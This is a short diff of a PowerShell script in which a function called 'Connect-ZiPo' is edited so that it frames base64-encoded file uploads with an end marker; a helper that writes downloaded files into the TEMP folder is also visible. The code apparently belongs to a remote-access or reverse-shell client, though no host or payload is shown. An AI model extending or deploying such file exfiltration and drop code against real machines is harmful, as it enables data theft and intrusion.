@@ -4,13 +4,14 @@ function Connect-ZiPo {
     $currentDir = Get-Location
 
     function Upload-File($path) {
-        if (Test-Path $path) {
-            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
-            return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
-        } else {
-            return "[ERROR]::FILE NOT FOUND: $path"
-        }
+    if (Test-Path $path) {
+        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
+        return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
+    } else {
+        return "[ERROR]::FILE NOT FOUND: $path"
     }
+}
+
 
     function Download-File($filename, $b64) {
         $out = "$env:TEMP\$filename"
